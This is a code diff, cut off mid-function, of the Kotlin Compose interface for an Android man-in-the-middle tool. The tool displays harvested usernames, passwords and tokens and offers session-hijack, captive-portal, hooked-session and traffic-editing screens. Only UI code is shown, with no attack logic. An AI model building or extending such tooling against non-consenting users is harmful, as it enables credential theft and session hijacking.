@@ -1,14 +1,13 @@
 @file:OptIn(ExperimentalLayoutApi::class, ExperimentalMaterial3Api::class)
-import androidx.compose.foundation.Image
 package com.cyberghost.ui
 
+import android.graphics.Bitmap
 import androidx.compose.animation.*
 import androidx.compose.animation.core.*
 import androidx.compose.foundation.*
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
-import androidx.compose.foundation.lazy.rememberLazyListState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
@@ -20,10 +19,14 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Brush
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.TextFieldValue
+import androidx.compose.ui.text.input.VisualTransformation
+import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.text.style.TextOverflow
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
@@ -59,9 +62,9 @@ fun CyberGhostTheme(content: @Composable () -> Unit) {
     MaterialTheme(colorScheme = CgColors, content = content)
 }
 
-enum class Screen { SETUP,
+enum class Screen {
     DASHBOARD, INTERCEPT, CREDENTIALS, DEVICES, HOOKED,
-    NETWORK, STATS, HIJACK, CAPTIVE, WEBSOCKET, SETTINGS, ABOUT
+    NETWORK, STATS, HIJACK, CAPTIVE, WEBSOCKET, SETTINGS, ABOUT, SETUP
 }
 
 // ============================
@@ -89,6 +92,7 @@ fun CyberGhostApp(
     wsFrames: List<WebSocketFrame>,
     savedSessions: List<String>,
     autoStartEnabled: Boolean,
+    gatewayIp: String = "192.168.43.1",
     onModeChange: (InterceptMode) -> Unit,
     onToggle: () -> Unit,
     onForward: (String, InterceptedPacket) -> Unit,
@@ -110,23 +114,18 @@ fun CyberGhostApp(
     onSaveSession: () -> Unit,
     onDeleteSession: (String) -> Unit,
     onShareSession: (String) -> Unit,
-    onToggleAutoStart: (Boolean) -> Unit,
-    gatewayIp: String = "192.168.43.1"
+    onToggleAutoStart: (Boolean) -> Unit
 ) {
     var currentScreen by remember { mutableStateOf(Screen.DASHBOARD) }
     var searchQuery by remember { mutableStateOf("") }
-    val newCredCount = remember { mutableStateOf(0) }
-
-    LaunchedEffect(credentials.size) {
-        if (credentials.size > newCredCount.value) newCredCount.value = credentials.size
-    }
 
     Scaffold(
         bottomBar = {
             NavigationBar(containerColor = CgSurface, tonalElevation = 0.dp) {
                 NavItem(Screen.DASHBOARD, currentScreen, Icons.Filled.Dashboard, "Home") { currentScreen = it }
                 NavItem(Screen.INTERCEPT, currentScreen, Icons.Filled.SwapVert, "Traffic") { currentScreen = it }
-                NavItem(Screen.CREDENTIALS, currentScreen, Icons.Filled.Key, "Creds", badge = if (credentials.isNotEmpty()) "${credentials.size}" else null) { currentScreen = it }
+                NavItem(Screen.CREDENTIALS, currentScreen, Icons.Filled.Key, "Creds",
+                    badge = if (credentials.isNotEmpty()) "${credentials.size}" else null) { currentScreen = it }
                 NavItem(Screen.DEVICES, currentScreen, Icons.Filled.Devices, "Devices") { currentScreen = it }
                 NavItem(Screen.SETTINGS, currentScreen, Icons.Filled.MoreHoriz, "More") { currentScreen = it }
             }
@@ -134,17 +133,22 @@ fun CyberGhostApp(
     ) { padding ->
         Box(Modifier.fillMaxSize().background(CgBg).padding(padding)) {
             when (currentScreen) {
-                Screen.DASHBOARD -> DashboardScreen(isRunning, onToggle, devices, hookedSessions, trafficStats, packets, credentials, captiveEntries, onExportHar) { currentScreen = it }
-                Screen.INTERCEPT -> InterceptScreen(interceptQueue, packets, searchQuery, { searchQuery = it }, onForward, onDrop, onInspectCert)
+                Screen.DASHBOARD -> DashboardScreen(isRunning, onToggle, devices, hookedSessions,
+                    trafficStats, packets, credentials, captiveEntries, onExportHar) { currentScreen = it }
+                Screen.INTERCEPT -> InterceptScreen(interceptQueue, packets, searchQuery,
+                    { searchQuery = it }, onForward, onDrop, onInspectCert)
                 Screen.CREDENTIALS -> CredentialsScreen(credentials, onClearCredentials) { currentScreen = Screen.HIJACK }
-                Screen.DEVICES -> DevicesScreen(devices, onSetNickname)
+                Screen.DEVICES -> DevicesScreen(devices, networkHosts, onSetNickname) { currentScreen = Screen.SETUP }
                 Screen.HOOKED -> HookedScreen(hookedSessions, events, onCommand)
                 Screen.NETWORK -> NetworkMapScreen(networkHosts, isScanning, onScanNetwork)
                 Screen.STATS -> StatsScreen(trafficStats)
                 Screen.HIJACK -> HijackScreen(hijackSessions, onHijackSession, onRemoveHijack)
                 Screen.CAPTIVE -> CaptiveScreen(captiveConfig, captiveEntries, onUpdateCaptiveConfig)
                 Screen.WEBSOCKET -> WebSocketScreen(wsFrames)
-                Screen.SETTINGS -> SettingsScreen(mode, onModeChange, currentConfig, onConfigUpdate, profiles, onSaveProfile, onLoadProfile, onDeleteProfile, onExportCa, savedSessions, onSaveSession, onDeleteSession, onShareSession, autoStartEnabled, onToggleAutoStart) { currentScreen = it }
+                Screen.SETTINGS -> SettingsScreen(mode, onModeChange, currentConfig, onConfigUpdate,
+                    profiles, onSaveProfile, onLoadProfile, onDeleteProfile, onExportCa,
+                    savedSessions, onSaveSession, onDeleteSession, onShareSession,
+                    autoStartEnabled, onToggleAutoStart) { currentScreen = it }
                 Screen.ABOUT -> AboutScreen()
                 Screen.SETUP -> QrSetupScreen(gatewayIp = gatewayIp, isRunning = isRunning, onExportCa = onExportCa)
             }
@@ -153,10 +157,15 @@ fun CyberGhostApp(
 }
 
 @Composable
-fun RowScope.NavItem(screen: Screen, current: Screen, icon: ImageVector, label: String, badge: String? = null, onSelect: (Screen) -> Unit) {
+fun RowScope.NavItem(
+    screen: Screen, current: Screen, icon: ImageVector,
+    label: String, badge: String? = null, onSelect: (Screen) -> Unit
+) {
     NavigationBarItem(
         icon = {
-            BadgedBox(badge = { badge?.let { Badge(containerColor = CgRed) { Text(it, fontSize = 8.sp) } } }) {
+            BadgedBox(badge = {
+                badge?.let { Badge(containerColor = CgRed) { Text(it, fontSize = 8.sp) } }
+            }) {
                 Icon(icon, contentDescription = label, modifier = Modifier.size(22.dp))
             }
         },
@@ -190,42 +199,36 @@ fun DashboardScreen(
 
     LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
         item {
-            // header
-            Box(Modifier.fillMaxWidth().clip(RoundedCornerShape(16.dp)).background(
-                Brush.linearGradient(listOf(CgGreen.copy(0.15f), CgCyan.copy(0.05f)))
-            ).padding(20.dp)) {
+            Box(Modifier.fillMaxWidth().clip(RoundedCornerShape(16.dp))
+                .background(Brush.linearGradient(listOf(CgGreen.copy(0.15f), CgCyan.copy(0.05f))))
+                .padding(20.dp)) {
                 Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                     Column {
                         Text("CYBERGHOST", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = CgGreen, letterSpacing = 3.sp)
                         Text("Active MITM Framework v2.0", fontSize = 11.sp, color = CgGray)
                         Spacer(Modifier.height(4.dp))
                         Row(verticalAlignment = Alignment.CenterVertically) {
-                            Box(Modifier.size(8.dp).clip(CircleShape).background(
-                                if (isRunning) CgGreen.copy(pulseAlpha) else CgRed
-                            ))
+                            Box(Modifier.size(8.dp).clip(CircleShape)
+                                .background(if (isRunning) CgGreen.copy(pulseAlpha) else CgRed))
                             Spacer(Modifier.width(6.dp))
                             Text(if (isRunning) "INTERCEPTING" else "OFFLINE", fontSize = 11.sp,
                                 color = if (isRunning) CgGreen else CgRed, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
                         }
                     }
-                    Button(
-                        onClick = onToggle,
-                        colors = ButtonDefaults.buttonColors(
-                            containerColor = if (isRunning) CgRed.copy(0.2f) else CgGreen.copy(0.2f)
-                        ),
+                    Button(onClick = onToggle,
+                        colors = ButtonDefaults.buttonColors(containerColor = if (isRunning) CgRed.copy(0.2f) else CgGreen.copy(0.2f)),
                         shape = RoundedCornerShape(14.dp),
-                        border = BorderStroke(1.dp, if (isRunning) CgRed.copy(0.5f) else CgGreen.copy(0.5f))
-                    ) {
+                        border = BorderStroke(1.dp, if (isRunning) CgRed.copy(0.5f) else CgGreen.copy(0.5f))) {
                         Icon(if (isRunning) Icons.Filled.Stop else Icons.Filled.PlayArrow,
                             contentDescription = null, tint = if (isRunning) CgRed else CgGreen, modifier = Modifier.size(18.dp))
                         Spacer(Modifier.width(6.dp))
-                        Text(if (isRunning) "STOP" else "START", color = if (isRunning) CgRed else CgGreen, fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                        Text(if (isRunning) "STOP" else "START",
+                            color = if (isRunning) CgRed else CgGreen, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                     }
                 }
             }
         }
 
-        // stat grid
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 StatCard("Devices", "${devices.size}", CgCyan, Icons.Filled.Devices, Modifier.weight(1f)) { navigateTo(Screen.DEVICES) }
@@ -245,7 +248,6 @@ fun DashboardScreen(
             }
         }
 
-        // protocol breakdown
         item {
             CgCard {
                 Text("Protocol Breakdown", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
@@ -258,26 +260,24 @@ fun DashboardScreen(
             }
         }
 
-        // quick actions
         item { SectionLabel("Quick Actions") }
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                ActionTile("QR\nSetup", Icons.Filled.QrCode, CgGreen, Modifier.weight(1f)) { navigateTo(Screen.SETUP) }
                 ActionTile("Network\nMap", Icons.Filled.Radar, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
-                ActionTile("Session\nHijack", Icons.Filled.Lock, CgRed, Modifier.weight(1f)) { navigateTo(Screen.HIJACK) }
-                ActionTile("Captive\nPortal", Icons.Filled.Wifi, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
-                ActionTile("WS\nFrames", Icons.Filled.Cable, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
+                ActionTile("Hijack", Icons.Filled.Lock, CgRed, Modifier.weight(1f)) { navigateTo(Screen.HIJACK) }
+                ActionTile("Portal", Icons.Filled.Wifi, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
             }
         }
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 ActionTile("Stats", Icons.Filled.BarChart, CgBlue, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
+                ActionTile("WS", Icons.Filled.Cable, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
                 ActionTile("Export\nHAR", Icons.Filled.FileDownload, CgDimGreen, Modifier.weight(1f), onExportHar)
                 ActionTile("Settings", Icons.Filled.Settings, CgGray, Modifier.weight(1f)) { navigateTo(Screen.SETTINGS) }
-                ActionTile("Setup", Icons.Filled.HelpOutline, CgGreen, Modifier.weight(1f)) { navigateTo(Screen.SETUP) }
             }
         }
 
-        // recent credentials alert
         if (credentials.isNotEmpty()) {
             item { SectionLabel("Latest Credential") }
             item {
@@ -299,7 +299,6 @@ fun DashboardScreen(
             }
         }
 
-        // recent activity
         if (packets.isNotEmpty()) {
             item { SectionLabel("Recent Traffic") }
             items(packets.takeLast(8).reversed()) { pkt -> CompactPacketRow(pkt) }
@@ -307,9 +306,13 @@ fun DashboardScreen(
     }
 }
 
+// ============================
+// SHARED COMPONENTS
+// ============================
 @Composable
 fun CgCard(content: @Composable ColumnScope.() -> Unit) {
-    Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth()) {
+    Card(colors = CardDefaults.cardColors(containerColor = CgCard),
+        shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth()) {
         Column(Modifier.padding(14.dp), content = content)
     }
 }
@@ -321,7 +324,8 @@ fun SectionLabel(text: String) {
 
 @Composable
 fun StatCard(label: String, value: String, color: Color, icon: ImageVector, modifier: Modifier = Modifier, onClick: () -> Unit = {}) {
-    Card(modifier = modifier.clickable(onClick = onClick), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
+    Card(modifier = modifier.clickable(onClick = onClick),
+        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
         Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
             Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(color.copy(0.15f)), contentAlignment = Alignment.Center) {
                 Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
@@ -337,22 +341,25 @@ fun StatCard(label: String, value: String, color: Color, icon: ImageVector, modi
 
 @Composable
 fun ActionTile(label: String, icon: ImageVector, color: Color, modifier: Modifier = Modifier, onClick: () -> Unit) {
-    Card(modifier = modifier.clickable(onClick = onClick).height(70.dp), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
-        Column(Modifier.fillMaxSize().padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
+    Card(modifier = modifier.clickable(onClick = onClick).height(70.dp),
+        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
+        Column(Modifier.fillMaxSize().padding(8.dp),
+            horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
             Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
             Spacer(Modifier.height(4.dp))
-            Text(label, fontSize = 9.sp, color = CgWhite, fontWeight = FontWeight.Medium, textAlign = androidx.compose.ui.text.style.TextAlign.Center, lineHeight = 12.sp)
+            Text(label, fontSize = 9.sp, color = CgWhite, fontWeight = FontWeight.Medium,
+                textAlign = TextAlign.Center, lineHeight = 12.sp)
         }
     }
 }
 
 @Composable
 fun ProtocolBar(label: String, count: Long, color: Color, total: Long) {
-    val fraction = if (total > 0) count.toFloat() / total.toFloat() else 0f
+    val fraction = if (total > 0) (count.toFloat() / total.toFloat()).coerceIn(0f, 1f) else 0f
     Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
         Text(label, fontSize = 11.sp, color = CgGray, modifier = Modifier.width(48.dp))
         Box(Modifier.weight(1f).height(8.dp).clip(RoundedCornerShape(4.dp)).background(CgBg)) {
-            Box(Modifier.fillMaxHeight().fillMaxWidth(fraction.coerceIn(0f, 1f)).clip(RoundedCornerShape(4.dp)).background(color))
+            Box(Modifier.fillMaxHeight().fillMaxWidth(fraction).clip(RoundedCornerShape(4.dp)).background(color))
         }
         Spacer(Modifier.width(8.dp))
         Text("$count", fontSize = 11.sp, color = color, modifier = Modifier.width(40.dp))
@@ -366,9 +373,31 @@ fun CompactPacketRow(pkt: InterceptedPacket) {
         Box(Modifier.size(6.dp).clip(CircleShape).background(color))
         Spacer(Modifier.width(8.dp))
         Text("${pkt.method ?: ""} ", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
-        Text("${pkt.host}${pkt.path.take(28)}", fontSize = 11.sp, color = CgWhite.copy(0.7f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
+        Text("${pkt.host}${pkt.path.take(28)}", fontSize = 11.sp, color = CgWhite.copy(0.7f),
+            maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
         Text(pkt.protocol, fontSize = 9.sp, color = color.copy(0.5f))
     }
+}
+
+@Composable
+fun EmptyState(icon: ImageVector, title: String, subtitle: String) {
+    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+        Column(horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.spacedBy(8.dp)) {
+            Box(Modifier.size(64.dp).clip(RoundedCornerShape(16.dp)).background(CgGray.copy(0.1f)),
+                contentAlignment = Alignment.Center) {
+                Icon(icon, contentDescription = null, tint = CgGray, modifier = Modifier.size(30.dp))
+            }
+            Text(title, fontSize = 15.sp, color = CgWhite, fontWeight = FontWeight.Medium)
+            Text(subtitle, fontSize = 12.sp, color = CgGray, textAlign = TextAlign.Center)
+        }
+    }
+}
+
+fun formatBytes(bytes: Long): String = when {
+    bytes < 1024 -> "$bytes B"
+    bytes < 1024 * 1024 -> "${bytes / 1024} KB"
+    bytes < 1024 * 1024 * 1024 -> "${"%.1f".format(bytes / (1024.0 * 1024.0))} MB"
+    else -> "${"%.2f".format(bytes / (1024.0 * 1024.0 * 1024.0))} GB"
 }
 
 // ============================
@@ -389,7 +418,8 @@ fun InterceptScreen(
             modifier = Modifier.fillMaxWidth().padding(12.dp).height(48.dp),
             textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
             singleLine = true, shape = RoundedCornerShape(10.dp),
-            colors = OutlinedTextFieldDefaults.colors(unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen, unfocusedContainerColor = CgCard, focusedContainerColor = CgCard)
+            colors = OutlinedTextFieldDefaults.colors(unfocusedBorderColor = CgGray.copy(0.3f),
+                focusedBorderColor = CgGreen, unfocusedContainerColor = CgCard, focusedContainerColor = CgCard)
         )
         val filtered = if (searchQuery.isBlank()) history else history.filter { pkt ->
             val q = searchQuery.lowercase()
@@ -426,26 +456,32 @@ fun InterceptCard(packet: InterceptedPacket, isPending: Boolean, onForward: (Int
             }
             Spacer(Modifier.height(6.dp))
             Text("${packet.method ?: ""} ${packet.host}${packet.path}", fontSize = 11.sp, color = CgWhite, maxLines = 2)
-            Spacer(Modifier.height(8.dp))
             if (isPending) {
+                Spacer(Modifier.height(8.dp))
                 OutlinedTextField(value = editedPath, onValueChange = { editedPath = it },
                     label = { Text("Path", fontSize = 10.sp) },
                     textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite, fontFamily = FontFamily.Monospace),
                     modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
-                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
+                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg,
+                        focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                 Spacer(Modifier.height(6.dp))
                 OutlinedTextField(value = editedBody, onValueChange = { editedBody = it },
                     label = { Text("Body", fontSize = 10.sp) },
                     textStyle = androidx.compose.ui.text.TextStyle(fontSize = 10.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace),
                     modifier = Modifier.fillMaxWidth().heightIn(min = 60.dp, max = 150.dp), shape = RoundedCornerShape(8.dp),
-                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
+                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg,
+                        focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                 Spacer(Modifier.height(8.dp))
                 Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                     Button(onClick = { onForward(packet.copy(path = editedPath.text, body = editedBody.text.toByteArray())) },
-                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp),
-                        border = BorderStroke(1.dp, CgGreen.copy(0.4f))) { Text("Forward", color = CgGreen, fontSize = 12.sp) }
-                    Button(onClick = onDrop, colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)), shape = RoundedCornerShape(8.dp),
-                        border = BorderStroke(1.dp, CgRed.copy(0.4f))) { Text("Drop", color = CgRed, fontSize = 12.sp) }
+                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)),
+                        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgGreen.copy(0.4f))) {
+                        Text("Forward", color = CgGreen, fontSize = 12.sp)
+                    }
+                    Button(onClick = onDrop, colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)),
+                        shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgRed.copy(0.4f))) {
+                        Text("Drop", color = CgRed, fontSize = 12.sp)
+                    }
                 }
             }
         }
@@ -464,17 +500,20 @@ fun PacketCard(pkt: InterceptedPacket, onTapHost: () -> Unit) {
                 Spacer(Modifier.width(6.dp))
                 Text("${pkt.method ?: ""} ", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                 Text(pkt.host, fontSize = 11.sp, color = CgWhite.copy(0.8f), modifier = Modifier.clickable(onClick = onTapHost))
-                Text(pkt.path.take(22), fontSize = 11.sp, color = CgGray, maxLines = 1, modifier = Modifier.weight(1f), overflow = TextOverflow.Ellipsis)
+                Text(pkt.path.take(22), fontSize = 11.sp, color = CgGray, maxLines = 1,
+                    modifier = Modifier.weight(1f), overflow = TextOverflow.Ellipsis)
                 pkt.statusCode?.let { Text("$it", fontSize = 10.sp, color = if (it < 400) CgDimGreen else CgRed) }
             }
             if (expanded) {
                 Spacer(Modifier.height(6.dp))
                 pkt.headers.entries.take(6).forEach { (k, v) ->
-                    Text("$k: ${v.take(55)}", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                    Text("$k: ${v.take(55)}", fontSize = 9.sp, color = CgGray,
+                        fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                 }
                 if (pkt.body.isNotEmpty()) {
                     Spacer(Modifier.height(4.dp))
-                    Text(String(pkt.body).take(200), fontSize = 9.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace, maxLines = 4, overflow = TextOverflow.Ellipsis)
+                    Text(String(pkt.body).take(200), fontSize = 9.sp, color = CgDimGreen,
+                        fontFamily = FontFamily.Monospace, maxLines = 4, overflow = TextOverflow.Ellipsis)
                 }
             }
         }
@@ -482,22 +521,25 @@ fun PacketCard(pkt: InterceptedPacket, onTapHost: () -> Unit) {
 }
 
 // ============================
-// CREDENTIALS SCREEN
+// CREDENTIALS
 // ============================
 @Composable
 fun CredentialsScreen(credentials: List<HarvestedCredential>, onClear: () -> Unit, onGoHijack: () -> Unit) {
     Column(Modifier.fillMaxSize()) {
-        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp),
+            horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Column {
                 Text("Credentials", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                 Text("${credentials.size} captured", fontSize = 12.sp, color = if (credentials.isEmpty()) CgGray else CgRed)
             }
-            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                if (credentials.isNotEmpty()) {
-                    OutlinedButton(onClick = onGoHijack, shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgCyan.copy(0.5f))) {
+            if (credentials.isNotEmpty()) {
+                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                    OutlinedButton(onClick = onGoHijack, shape = RoundedCornerShape(8.dp),
+                        border = BorderStroke(1.dp, CgCyan.copy(0.5f))) {
                         Text("Hijack", fontSize = 11.sp, color = CgCyan)
                     }
-                    OutlinedButton(onClick = onClear, shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
+                    OutlinedButton(onClick = onClear, shape = RoundedCornerShape(8.dp),
+                        border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
                         Text("Clear", fontSize = 11.sp, color = CgRed)
                     }
                 }
@@ -532,23 +574,27 @@ fun CredentialCard(cred: HarvestedCredential) {
                 Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                     Box(Modifier.size(8.dp).clip(CircleShape).background(typeColor))
                     Spacer(Modifier.width(8.dp))
-                    Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                    Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite,
+                        maxLines = 1, overflow = TextOverflow.Ellipsis)
                 }
                 Badge(containerColor = typeColor.copy(0.2f)) {
-                    Text(cred.type.name.replace("_", " "), fontSize = 8.sp, color = typeColor, modifier = Modifier.padding(horizontal = 4.dp))
+                    Text(cred.type.name.replace("_", " "), fontSize = 8.sp, color = typeColor,
+                        modifier = Modifier.padding(horizontal = 4.dp))
                 }
             }
             Spacer(Modifier.height(8.dp))
             cred.username?.let { CredRow("User", it, CgCyan) }
             cred.password?.let { CredRow("Pass", it, CgRed) }
             cred.token?.let { CredRow("Token", it.take(40) + if (it.length > 40) "…" else "", CgAmber) }
-            Text("${cred.sourceIp} · ${cred.protocol} · ${cred.path.take(30)}", fontSize = 9.sp, color = CgGray, modifier = Modifier.padding(top = 4.dp))
+            Text("${cred.sourceIp} · ${cred.protocol} · ${cred.path.take(30)}",
+                fontSize = 9.sp, color = CgGray, modifier = Modifier.padding(top = 4.dp))
             if (expanded && cred.rawFields.isNotEmpty()) {
                 Spacer(Modifier.height(8.dp))
                 HorizontalDivider(color = CgGray.copy(0.2f))
                 Spacer(Modifier.height(6.dp))
                 cred.rawFields.entries.forEach { (k, v) ->
-                    Text("$k: $v", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
+                    Text("$k: $v", fontSize = 9.sp, color = CgGray,
+                        fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                 }
             }
         }
@@ -559,7 +605,8 @@ fun CredentialCard(cred: HarvestedCredential) {
 fun CredRow(label: String, value: String, color: Color) {
     Row(Modifier.padding(vertical = 1.dp)) {
         Text("$label: ", fontSize = 11.sp, color = CgGray, fontWeight = FontWeight.Medium)
-        Text(value, fontSize = 11.sp, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
+        Text(value, fontSize = 11.sp, color = color, fontFamily = FontFamily.Monospace,
+            fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
     }
 }
 
@@ -567,15 +614,79 @@ fun CredRow(label: String, value: String, color: Color) {
 // DEVICES SCREEN
 // ============================
 @Composable
-fun DevicesScreen(devices: List<ConnectedDevice>, onSetNickname: (String, String) -> Unit) {
+fun DevicesScreen(
+    devices: List<ConnectedDevice>,
+    networkHosts: List<NetworkHost>,
+    onSetNickname: (String, String) -> Unit,
+    onGoSetup: () -> Unit
+) {
+    val allIps = devices.map { it.ip }.toSet()
+    // merge network hosts not already in devices list
+    val extraHosts = networkHosts.filter { it.ip !in allIps && !it.isGateway }
+
     LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
-                Text("Connected Devices", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
-                Badge(containerColor = CgCyan.copy(0.2f)) { Text("${devices.size}", fontSize = 12.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)) }
+                Column {
+                    Text("Connected Devices", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
+                    Text("${devices.size + extraHosts.size} discovered", fontSize = 12.sp, color = CgGray)
+                }
+                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                    Badge(containerColor = CgCyan.copy(0.2f)) {
+                        Text("${devices.size + extraHosts.size}", fontSize = 12.sp, color = CgCyan,
+                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
+                    }
+                    OutlinedButton(onClick = onGoSetup, shape = RoundedCornerShape(8.dp),
+                        border = BorderStroke(1.dp, CgGreen.copy(0.5f)),
+                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp)) {
+                        Icon(Icons.Filled.QrCode, contentDescription = null, tint = CgGreen, modifier = Modifier.size(14.dp))
+                        Spacer(Modifier.width(4.dp))
+                        Text("Setup", fontSize = 11.sp, color = CgGreen)
+                    }
+                }
             }
         }
+
+        if (devices.isEmpty() && extraHosts.isEmpty()) {
+            item {
+                EmptyState(Icons.Filled.Devices, "No devices found",
+                    "Connect devices to your hotspot, then scan in Network Map")
+            }
+        }
+
+        // devices that have sent proxy traffic
         items(devices) { device -> DeviceCard(device, onSetNickname) }
+
+        // devices discovered by scan but haven't set proxy yet
+        if (extraHosts.isNotEmpty()) {
+            item { SectionLabel("Discovered (need proxy setup)") }
+            items(extraHosts) { host ->
+                Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard),
+                    shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgAmber.copy(0.2f))) {
+                    Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
